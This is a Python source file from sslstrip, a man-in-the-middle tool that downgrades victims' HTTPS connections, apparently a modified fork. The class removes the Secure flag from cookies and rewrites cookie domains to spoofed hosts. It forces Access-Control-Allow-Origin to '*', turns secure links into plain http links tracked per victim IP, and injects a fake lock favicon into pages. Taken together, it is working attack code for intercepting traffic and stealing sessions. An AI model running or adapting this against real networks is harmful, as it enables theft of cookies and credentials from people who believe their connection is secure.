# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, string

from ServerConnection import ServerConnection

class SSLServerConnection(ServerConnection):

    ''' 
    For SSL connections to a server, we need to do some additional stripping.  First we need
    to make note of any relative links, as the server will be expecting those to be requested
    via SSL as well.  We also want to slip our favicon in here and kill the secure bit on cookies.
    '''

    cookieExpression   = re.compile(r"([ \w\d:#@%/;$()~_?\+-=\\\.&]+); ?Secure", re.IGNORECASE)
    cssExpression      = re.compile(r"url\(([\w\d:#@%/;$~_?\+-=\\\.&]+)\)", re.IGNORECASE)
    iconExpression     = re.compile(r"<link rel=\"shortcut icon\" .*href=\"([\w\d:#@%/;$()~_?\+-=\\\.&]+)\".*>", re.IGNORECASE)
    linkExpression     = re.compile(r"<((a)|(link)|(img)|(script)|(frame)) .*((href)|(src))=\"([\w\d:#@%/;$()~_?\+-=\\\.&]+)\".*>", re.IGNORECASE)
    headExpression     = re.compile(r"<head>", re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
        ServerConnection.__init__(self, command, uri, postData, headers, client)

    def getLogLevel(self):
        return logging.INFO

    def getPostPrefix(self):
        return "SECURE POST"

    def handleHeader(self, key, value):
        if (key.lower() == 'set-cookie'):
        	newvalues =[]
        	value = SSLServerConnection.cookieExpression.sub("\g<1>", value)
        	values = value.split(';')
        	for v in values:
        		if v[:7].lower()==' domain':
        			dominio=v.split("=")[1]
        			logging.debug("LEO Parsing cookie domain parameter: %s"%v)
        			real = self.urlMonitor.sustitucion
        			if dominio in real:
        				v=" Domain=%s"%real[dominio]
        				logging.debug("LEO New cookie domain parameter: %s"%v)
        		newvalues.append(v)
        	value = ';'.join(newvalues)
        
        if (key.lower() == 'access-control-allow-origin'):
        	value='*'
        
        ServerConnection.handleHeader(self, key, value)

    def stripFileFromPath(self, path):
        (strippedPath, lastSlash, file) = path.rpartition('/')
        return strippedPath

    def buildAbsoluteLink(self, link):
        absoluteLink = ""
        
        if ((not link.startswith('http')) and (not link.startswith('/'))):                
            absoluteLink = "http://"+self.headers['host']+self.stripFileFromPath(self.uri)+'/'+link

            logging.debug("Found path-relative link in secure transmission: " + link)
            logging.debug("New Absolute path-relative link: " + absoluteLink)                
        elif not link.startswith('http'):
            absoluteLink = "http://"+self.headers['host']+link

            logging.debug("Found relative link in secure transmission: " + link)
            logging.debug("New Absolute link: " + absoluteLink)                            

        if not absoluteLink == "":                
            absoluteLink = absoluteLink.replace('&amp;', '&')
            self.urlMonitor.addSecureLink(self.client.getClientIP(), absoluteLink);        

    def replaceCssLinks(self, data):
        iterator = re.finditer(SSLServerConnection.cssExpression, data)

        for match in iterator:
            self.buildAbsoluteLink(match.group(1))

        return data

    def replaceFavicon(self, data):
        match = re.search(SSLServerConnection.iconExpression, data)

        if (match != None):
            data = re.sub(SSLServerConnection.iconExpression,
                          "<link rel=\"SHORTCUT ICON\" href=\"/favicon-x-favicon-x.ico\">", data)
        else:
            data = re.sub(SSLServerConnection.headExpression,
                          "<head><link rel=\"SHORTCUT ICON\" href=\"/favicon-x-favicon-x.ico\">", data)
            
        return data
        
    def replaceSecureLinks(self, data):
        data = ServerConnection.replaceSecureLinks(self, data)
        data = self.replaceCssLinks(data)

        if (self.urlMonitor.isFaviconSpoofing()):
            data = self.replaceFavicon(data)

        iterator = re.finditer(SSLServerConnection.linkExpression, data)

        for match in iterator:
            self.buildAbsoluteLink(match.group(10))

        return data
